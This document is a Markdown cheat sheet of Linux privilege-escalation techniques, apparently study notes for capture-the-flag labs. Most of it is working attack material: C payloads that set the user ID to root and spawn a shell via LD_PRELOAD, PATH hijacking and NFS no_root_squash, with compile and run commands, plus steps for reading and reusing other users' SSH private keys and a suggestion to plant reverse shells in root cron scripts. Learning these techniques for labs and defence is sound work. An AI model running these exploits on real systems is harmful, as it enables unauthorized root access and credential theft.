# Privilege Escalation and Enumeration Techniques

## Enumeration
Before attempting any privilege escalation techniques, it is crucial to first enumerate the system. System enumeration provides essential context that guides the selection of appropriate escalation methods.

### Checking `su` Privileges
To determine if the current user has privileges to use the `su` command:
```bash
cat /etc/pam.d/su
```
This file governs PAM (Pluggable Authentication Modules) configurations for the `su` binary.

---

## Privilege Escalation Techniques

### Kernel Exploits
Identifying the system's kernel version can lead to privilege escalation if an associated vulnerability is found. These vulnerabilities can often be exploited using public CVEs.

- **Check kernel version:**
```bash
uname -r
```
- **Look for matching CVEs:** [Linux Kernels CVEs](https://www.linuxkernelcves.com/cves)

After identifying a suitable exploit:
1. Understand the exploit thoroughly.
2. Transfer the exploit to the target system (e.g., using Python's `SimpleHTTPServer` on the attacker machine and `wget` on the target).

---

### Sudo Exploitation
Use the following command to list sudo privileges:
```bash
sudo -l
```
Check the output for potentially exploitable binaries or scripts.

- Use [GTFO Bins](https://gtfobins.github.io/) to find ways to exploit commands listed by `sudo -l`.

#### Example Output:
```
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```
This indicates full root-level access without needing a password.

#### Leveraging Application Functions
Some applications (like Apache2) might support loading alternate configuration files. If the `sudo -l` output includes:
```
env_keep+=LD_PRELOAD
```
This allows dynamic loading of shared libraries into binaries.

- Example malicious shared object code (C):
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

- Compile and run:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

---

### SUID (Set-user Identification)
Files with the SUID or SGID bit set run with the privileges of the file owner.

- List SUID/SGID files:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
- Use [GTFO Bins](https://gtfobins.github.io/) with the "SUID" filter to look for exploitable binaries.

Use `ls -la` to analyze suspicious files further.

---

### Capabilities
Linux capabilities provide fine-grained control over root-like privileges.

- Check enabled capabilities:
```bash
getcap -r / 2>/dev/null
```
- Compare results with [GTFO Bins](https://gtfobins.github.io/) to identify escalation vectors.

---

### Cron Jobs
Cron jobs execute scripts at regular intervals with the privileges of the file owner.

- View crontab configuration:
```bash
cat /etc/crontab
```

If a script is editable and runs as root, replace its contents with a reverse shell or privilege-escalating payload and set up a listener to catch the shell.

---

### PATH Variable Hijacking
The `PATH` environment variable tells the system where to find executables.

- Check PATH:
```bash
echo $PATH
```
- Check for writable directories:
```bash
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```

If a writable directory is in `PATH`, you can create a fake binary with the same name as a called command.

#### Example Exploit:
1. C code (`path_exp.c`):
```c
#include<unistd.h>
void main() {
  setuid(0);
  setgid(0);
  system("thm");
}
```
2. Compile and set SUID:
```bash
gcc path_exp.c -o path -w
chmod u+s path
```
3. Add writable dir to PATH and place `thm`:
```bash
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm
./path
```

---

### NFS (Network File System)
If `no_root_squash` is set for an exported share, files created by root on the client are preserved as root on the server.

- Check `/etc/exports`:
```bash
cat /etc/exports
```
- Find exports:
```bash
showmount -e <target-IP>
```
- Mount the export:
```bash
mkdir /tmp/backupsonattackermachine
mount -o rw <target-IP>:/backups /tmp/backupsonattackermachine
```
- Create exploit file (`nfs.c`):
```c
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```
- Compile and set SUID:
```bash
gcc nfs.c -o nfs -w
chmod +s nfs
```
- Execute on target:
```bash
./nfs
```

---

### Readable Folders for SSH Access
Enumerate readable folders to find potential SSH private keys.

- Find readable folders:
```bash
find / -readable 2>/dev/null | cut -d "/" -f 2 | sort -u
```
- Navigate to user folders with readable permissions:
```bash
cd /home
ls -la
```
- Check `.ssh` directory:
```bash
ls -la .ssh
cat id_rsa
```
- Copy the key and use it to log in:
```bash
chmod 600 key_file
ssh user@<IP_ADDRESS> -i key_file
```

---

